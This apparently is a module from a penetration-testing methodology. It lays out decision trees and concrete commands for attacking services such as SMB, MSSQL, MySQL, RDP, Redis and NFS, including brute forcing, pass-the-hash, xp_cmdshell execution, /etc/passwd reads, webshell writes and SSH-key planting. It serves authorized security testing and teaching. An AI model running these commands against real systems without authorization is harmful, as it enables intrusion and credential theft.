# Module 07: Common Services Attack Methodology

## When to Use This Module
Use this module when you've identified open network services (FTP, SMB, RDP, MSSQL, MySQL, SMTP, DNS, etc.) during enumeration (Module 02). This module provides the decision tree for attacking each service based on what you find.

## Prerequisites
- Open port identified with service version (from Module 02)
- Network connectivity to target service

## Entry Check

```
Service found on open port?
├── Port has standard service? → Check table below
├── Non-standard port but service fingerprintable?
│   ├── Banner grab: nc -nv <target> <port>
│   └── Check response to generic probes
└── Unknown service → Search for protocol-specific tools
```

## Service Attack Decision Trees

### FTP (21)
```
Anonymous login allowed?
├── Yes → ls -la, download all files
│   ├── Sensitive files found? → Save to evidence
│   └── Nothing interesting → Check write access
├── Write access? → Upload webshell, overwrite configs
├── Brute force → hydra -L users.txt -P pass.txt ftp://target
├── FTP Bounce scan → nmap -b anonymous:pass@ftp <internal_target>
└── Check version for known vulns → searchsploit <version>
```

### SMB (139, 445)
```
SMB accessible?
├── Null session / anonymous?
│   ├── enum4linux, smbclient -L, rpcclient
│   ├── Enumerate: users, groups, shares, OS info
│   └── Accessible shares?
│       ├── Read → Download sensitive files
│       └── Write → Upload malicious files / webshell
├── Credentials available?
│   ├── netexec smb target -u user -p pass
│   ├── List shares: netexec smb target --shares
│   ├── Execute: netexec smb target -x whoami
│   └── Pass-the-Hash: netexec smb target -u user -H hash
├── SMB signing disabled?
│   └── NTLM relay possible → ntlmrelayx.py
├── EternalBlue? → nmap --script smb-vuln-ms17-010
└── Check version → searchsploit smb
```

### MSSQL (1433)
```
MSSQL accessible?
├── Default creds? → sa:sa, sa:(empty), sa:password
├── Brute force → hydra mssql://target
├── Authenticated?
│   ├── xp_cmdshell → Enable and execute commands
│   │   EXEC xp_cmdshell 'whoami'
│   ├── Linked servers → Enumerate for lateral movement
│   │   SELECT * FROM OPENQUERY(<link>, 'SELECT @@version')
│   ├── User impersonation? → EXECUTE AS LOGIN = 'sa'
│   ├── Capture hash → xp_dirtree to attacker SMB share
│   └── Write file → sp_OACreate for file write
└── Impacket: mssqlclient.py user:pass@target
```

### MySQL (3306)
```
MySQL accessible?
├── Default creds? → root:root, root:(empty)
├── Brute force → hydra mysql://target
├── Authenticated?
│   ├── Read files: SELECT LOAD_FILE('/etc/passwd')
│   ├── Write files: SELECT "code" INTO OUTFILE '/path/shell.php'
│   ├── UDF RCE → If FILE priv and writable plugin dir
│   └── Dump creds from mysql.user
└── Check version → searchsploit mysql
```

### RDP (3389)
```
RDP accessible?
├── Default creds? → administrator:(empty)
├── Brute force → hydra rdp://target
├── Password spray → crowbar -b rdp -s target -U users -c pass
├── Pass-the-Hash → xfreerdp /v:target /u:user /pth:hash
│   ⚠ Requires Restricted Admin Mode on target (DisableRestrictedAdmin=0)
│   Check: reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
├── Session hijack (SYSTEM) → tscon.exe
├── BlueKeep? (CVE-2019-0708) → nmap script check
└── Creds from elsewhere? → Try them here
```

### WinRM (5985, 5986)
```
WinRM accessible?
├── Creds available?
│   ├── evil-winrm -i target -u user -p pass
│   └── evil-winrm -i target -u user -H hash
├── Brute force → netexec winrm target -u users -p pass
└── Check for unconstrained delegation
```

### SMTP (25, 587)
```
SMTP accessible?
├── Open relay? → Test: send email to external domain
│   └── Send spoofed phishing email
├── VRFY/EXPN?
│   ├── VRFY root → confirms user exists
│   └── EXPN root → reveals alias targets
├── User enumeration: smtp-user-enum
└── Check version → searchsploit
```

### DNS (53)
```
DNS accessible?
├── Zone transfer? → dig axfr @target domain
├── Subdomain brute force → dnsrecon
├── DNS cache snooping → Check cached records
└── Check for dynamic DNS updates (MS AD)
```

### NFS (2049)
```
NFS accessible?
├── showmount -e target → List exports
├── Mount accessible shares
│   ├── mount -t nfs target:/share /mnt
│   └── Look for SSH keys, configs, sensitive files
├── root_squash disabled?
│   └── Create SUID binary on share
└── Check NFS version for vulns
```

### SNMP (161)
```
SNMP accessible?
├── Default community strings? → public, private
├── Enumerate via: snmpwalk -v2c -c public target
├── Enumerate Windows: snmpwalk -c public target 1.3.6.1.4.1.77.1.2.25
├── Enumerate running processes
├── Enumerate installed software
├── Enumerate running services
└── Check for writable community strings (private)
```

### Redis (6379)
```
Redis accessible?
├── No auth? → keys *, CONFIG GET *
├── Write SSH key → CONFIG SET dir /root/.ssh; SET sshkey "..."
├── Write webshell → CONFIG SET dir /var/www/html
├── Dump database → redis-dump
└── Check for Lua sandbox escape
```

### Oracle DB (1521)
```
Oracle accessible?
├── Default creds? → system:manager, scott:tiger
├── TNS poisoning → odat.py
├── Authenticated?
│   ├── Execute OS commands: Java procedures
│   └── Extract password hashes
└── Check version → searchsploit odat
```

### PostgreSQL (5432)
```
PostgreSQL accessible?
├── Default creds? → postgres:postgres
├── Authenticated?
│   ├── Read files: SELECT pg_read_file('/etc/passwd')
│   ├── Write files: COPY (SELECT 'shell') TO '/var/www/html/shell.php'
│   └── RCE: COPY (SELECT '') TO PROGRAM 'whoami'  (requires superuser or pg_execute_server_program role)
└── Check version → searchsploit
```

### LDAP (389, 636)
```
LDAP accessible?
├── Anonymous bind?
│   ├── ldapsearch -x -h target -b "dc=domain,dc=local"
│   └── Dump entire directory → Useful for AD recon
└── Authenticated?
    └── In-depth AD enumeration → Module 11
```

## Cross-References
- For password cracking found hashes → [Module 06: Password Attacks](06-password-attacks.md)
- For shells after RCE → [Module 05: Initial Access](05-initial-access.md)
- For AD-connected services → [Module 11: Active Directory](11-active-directory.md)
- For post-exploitation after access → [Module 13: Post-Exploitation](13-post-exploitation.md)

## Output Summary
- [ ] All service versions fingerprinted
- [ ] Anonymous/null sessions tested where applicable
- [ ] Default credentials attempted
- [ ] Brute force/password spray attempted (within policy)
- [ ] RCE attempted where possible
- [ ] All findings documented with commands and output
